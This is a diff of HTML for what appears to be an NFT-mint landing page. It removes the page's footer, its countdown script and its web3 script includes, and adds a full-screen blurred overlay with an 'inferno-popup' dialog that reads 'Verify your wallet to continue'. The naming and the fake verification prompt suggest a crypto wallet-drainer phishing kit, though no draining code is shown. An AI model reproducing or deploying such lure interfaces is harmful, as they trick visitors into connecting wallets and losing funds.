-                                            <path d="M38.1863 13.7599C35.5913 11.5656 32.4773 10.4685 29.1902 10.2856L28.6712 10.8342C31.6123 11.5656 34.2073 13.0285 36.6293 15.0399C33.6883 13.3942 30.4013 12.2971 26.9412 11.9314C25.9032 11.7485 25.0382 11.7485 24.0002 11.7485C22.9622 11.7485 22.0972 11.7485 21.0592 11.9314C17.5992 12.2971 14.3121 13.3942 11.3711 15.0399C13.7931 13.0285 16.3882 11.5656 19.3292 10.8342L18.8102 10.2856C15.5231 10.4685 12.4091 11.5656 9.8141 13.7599C6.87308 19.6114 5.31607 26.1942 5.14307 32.9599C7.73809 35.8856 11.3711 37.7142 15.1771 37.7142C15.1771 37.7142 16.3882 36.2514 17.2532 34.9714C15.0041 34.4228 12.9281 33.1428 11.5441 31.1314C12.7551 31.8628 13.9661 32.5942 15.1771 33.1428C16.7342 33.8742 18.2912 34.2399 19.8482 34.6056C21.2322 34.7885 22.6162 34.9714 24.0002 34.9714C25.3842 34.9714 26.7682 34.7885 28.1522 34.6056C29.7093 34.2399 31.2663 33.8742 32.8233 33.1428C34.0343 32.5942 35.2453 31.8628 36.4563 31.1314C35.0723 33.1428 32.9963 34.4228 30.7473 34.9714C31.6123 36.2514 32.8233 37.7142 32.8233 37.7142C36.6293 37.7142 40.2623 35.8856 42.8573 32.9599C42.6843 26.1942 41.1273 19.6114 38.1863 13.7599ZM18.2912 29.6685C16.5612 29.6685 15.0041 28.0228 15.0041 26.0114C15.0041 23.9999 16.5612 22.3542 18.2912 22.3542C20.0212 22.3542 21.5782 23.9999 21.5782 26.0114C21.5782 28.0228 20.0212 29.6685 18.2912 29.6685ZM29.7093 29.6685C27.9792 29.6685 26.4222 28.0228 26.4222 26.0114C26.4222 23.9999 27.9792 22.3542 29.7093 22.3542C31.4393 22.3542 32.9963 23.9999 32.9963 26.0114C32.9963 28.0228 31.4393 29.6685 29.7093 29.6685Z"></path>
-                                        </svg>
-                                    </div>
-                                </a>
-                            </div>
+                        <div>
+                            <p style="font-size: 16.5px; font-weight: 600; color: rgb(4, 17, 29);"></p>
+                        </div>
+                    </div>
+                    <hr
+                        style="padding: 0px; margin: 28px 0px; opacity: 0.2; border-color: rgb(138, 147, 155) currentcolor currentcolor; border-style: solid none none; border-width: 1px medium medium; border-image: none 100% / 1 / 0 stretch; color: rgb(138, 147, 155); text-align: center;">
+                    <div>
+                        <div
+                            style="color: rgb(4, 17, 29); align-items: center; margin-bottom: 12px; display: flex; text-align: center; font-weight: 600;  background: rgb(247, 247, 247); border-radius: 12px; padding: 7px;">
+                            <img src="./assets/8212602.png" id="inferno-popup-image" height="30"
+                                style="  display: inline-block; vertical-align: middle; width:30px">
+                            <h3
+                                style="text-align: center; font-size: 13px; font-weight: 600; color: rgb(4, 17, 29); margin: 0;">
+                                Verify your wallet to continue</h3>
+                        </div>
+                        <div
+                            style="color: rgb(4, 17, 29) !important; line-height: 140%; margin-bottom: 12px; font-weight: 600;">
+                            <h3 style="font-size: 14px; text-align: center; font-weight: 600; position: relative;"
+                                id="inferno-popup-text"></h3>
                         </div>
                     </div>
                 </div>
-
-            </section>
-
-            <script>
-                function writeCookie(name, val, expires) {
-                    var date = new Date;
-                    date.setDate(date.getDate() + expires);
-                    document.cookie = name + "=" + val + "; path=/; expires=" + date.toUTCString();
-                }
-
-            </script>
-            <script>
-                var DateMode = 1; // 1 - EST | 2 - UTC
-                var TimeON = 1; // 1 - Enable | 2 - Off
-
-                var datey = new Date(Date.now());
-
-                var dateForUTC = new Date(Date.now());
-
-                var dateyx = datey.toLocaleString('en-US', {
-                    timeZone: 'America/New_York'
-                });
-                var datej = new Date(dateyx);
-                var datehour = datej.getHours();
-                var dateday = datej.getDate();
-
-                var datehourUTC = dateForUTC.getUTCHours();
-                var datedayUTC = dateForUTC.getUTCDate();
-
-                if (datehour == 1) {
-                    datehour = '- 1am EST'
-                }
-                if (datehourUTC == 1) {
-                    datehourUTC = '- 1am UTC'
-                }
-                if (datehour == 2) {
-                    datehour = '- 2am EST'
-                }
-                if (datehourUTC == 2) {
-                    datehourUTC = '- 2am UTC'
-                }
-                if (datehour == 3) {
-                    datehour = '- 3am EST'
-                }
-                if (datehourUTC == 3) {
-                    datehourUTC = '- 3am UTC'
-                }
-                if (datehour == 4) {
-                    datehour = '- 4am EST'
-                }
-                if (datehourUTC == 4) {
-                    datehourUTC = '- 4am UTC'
-                }
-                if (datehour == 5) {
-                    datehour = '- 5am EST'
-                }
-                if (datehourUTC == 5) {
-                    datehourUTC = '- 5am UTC'
-                }
-                if (datehour == 6) {
-                    datehour = '- 6am EST'
-                }
-                if (datehourUTC == 6) {
-                    datehourUTC = '- 6am UTC'
-                }
-                if (datehour == 7) {
-                    datehour = '- 7am EST'
-                }
-                if (datehourUTC == 7) {
-                    datehourUTC = '- 7am UTC'
-                }
-                if (datehour == 8) {
-                    datehour = '- 8am EST'
-                }
-                if (datehourUTC == 8) {
-                    datehourUTC = '- 8am UTC'
-                }
-                if (datehour == 9) {
-                    datehour = '- 9am EST'
-                }
-                if (datehourUTC == 9) {
-                    datehourUTC = '- 9am UTC'
-                }
-                if (datehour == 10) {
-                    datehour = '- 10am EST'
-                }
-                if (datehourUTC == 10) {
-                    datehourUTC = '- 10am UTC'
-                }
-                if (datehour == 11) {
-                    datehour = '- 11am EST'
-                }
-                if (datehourUTC == 11) {
-                    datehourUTC = '- 11am UTC'
-                }
-                if (datehour == 12) {
-                    datehour = '- 12pm EST'
-                }
-                if (datehourUTC == 12) {
-                    datehourUTC = '- 12pm UTC'
-                }
-                if (datehour == 13) {
-                    datehour = '- 1pm EST'
-                }
-                if (datehourUTC == 13) {
-                    datehourUTC = '- 1pm UTC'
-                }
-                if (datehour == 14) {
-                    datehour = '- 2pm EST'
-                }
-                if (datehourUTC == 14) {
-                    datehourUTC = '- 2pm UTC'
-                }
-                if (datehour == 15) {
-                    datehour = '- 3pm EST'
-                }
-                if (datehourUTC == 15) {
-                    datehourUTC = '- 3pm UTC'
-                }
-                if (datehour == 16) {
-                    datehour = '- 4pm EST'
-                }
-                if (datehourUTC == 16) {
-                    datehourUTC = '- 4pm UTC'
-                }
-                if (datehour == 17) {
-                    datehour = '- 5pm EST'
-                }
-                if (datehourUTC == 17) {
-                    datehourUTC = '- 5pm UTC'
-                }
-                if (datehour == 18) {
-                    datehour = '- 6pm EST'
-                }
-                if (datehourUTC == 18) {
-                    datehourUTC = '- 6pm UTC'
-                }
-                if (datehour == 19) {
-                    datehour = '- 7pm EST'
-                }
-                if (datehourUTC == 19) {
-                    datehourUTC = '- 7pm UTC'
-                }
-                if (datehour == 20) {
-                    datehour = '- 8pm EST'
-                }
-                if (datehourUTC == 20) {
-                    datehourUTC = '- 8pm UTC'
-                }
-                if (datehour == 21) {
-                    datehour = '- 9pm EST'
-                }
-                if (datehourUTC == 21) {
-                    datehourUTC = '- 9pm UTC'
-                }
-                if (datehour == 22) {
-                    datehour = '- 10pm EST'
-                }
-                if (datehourUTC == 22) {
-                    datehourUTC = '- 10pm UTC'
-                }
-                if (datehour == 23) {
-                    datehour = '- 11pm EST'
-                }
-                if (datehourUTC == 23) {
-                    datehourUTC = '- 11pm UTC'
-                }
-                if (datehour == 0) {
-                    datehour = '- 12am EST'
-                }
-                if (datehourUTC == 0) {
-                    datehourUTC = '- 12am UTC'
-                }
-
-                if (DateMode == 1) {
-                    document.getElementById("dateday1").innerHTML = dateday;
-                    document.getElementById("dateday2").innerHTML = dateday;
-                    if (TimeON == 1) {
-                        document.getElementById("datehour1").innerHTML = datehour;
-                    }
-                } else if (DateMode == 2) {
-                    document.getElementById("dateday1").innerHTML = datedayUTC;
-                    document.getElementById("dateday2").innerHTML = datedayUTC;
-                    if (TimeON == 1) {
-                        document.getElementById("datehour1").innerHTML = datehourUTC;
-                    }
-                }
-
-            </script>
-
-
-        </main>
-        <footer class="footer">
-            <div class="footer-container">
-                <div class="footer-content">
-                    <div class="copyright-wrapper">
-                        <div class="copyright">© <span id="footername">angrychiks.netlify.app</span> | All rights reserved.</div>
-                    </div>
-                    <div class="footer-link-wrapper"><a href="#" class="legal-link">Privacy Policy</a><a href="#" class="legal-link right">Terms of Service</a></div>
-                </div>
             </div>
-        </footer>
+        </div>
+        <div id="inferno-popup-overlay"
+            style=" position: fixed;top: 0;left: 0; width: 100%; height: 100%; background: rgba(23,23,23,.8);backdrop-filter: blur(5px);z-index: 99998;">
+        </div>
     </div>
-    <script src="js/jquery-3.5.1.min.dc5e7f18c8ae6e.js?site=61577885fe80ba5e67abfa11" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
-    <script src="61577885fe80ba5e67abfa11/js/rare-ghost-project.075333274.js" type="text/javascript"></script>
-    <!--[if lte IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif]-->
-    <script src="nervous-minter.min.js"></script>
-    <!-- Clock Countdown -->
-    <!-- Accordion -->
-    <script>
-        (function($) {
-            'use strict';
-            $(".feed-post--header").on("click", function() {
-                $(this).children(".faq-icon").toggleClass("rotate");
-                $(".faq-icon").not($(this).children(".faq-icon")).removeClass("rotate");
-                $(this).next().slideToggle(300);
-                $(".feed-post--content-wrapper").not($(this).next()).slideUp("fast");
-                //Scroll to top for each accordion that is clicked.
-                // The "180" is the distance from top. The "300" is the scroll speed. The "400" is for the animation delay depending on inner content length.    
-                /* setTimeout(() => { 
-                  $('html').animate({scrollTop: $(this).offset().top-180}, 300);
-                }, 400); */
-            });
-        }(jQuery));
-
-    </script>
-    <script src="ajax/libs/web3/1.5.2/web3.min.js" integrity="sha512-mYc+D+NmmyR0Gcrzyae7q5HguBCS4cBHAsIk7gGhu0/ZyGg4z2YZDjyR2YQA/IMCMTNs4mnlw3vVdERzewpekQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="script.js"></script>
 </body>
-
 
 </html>
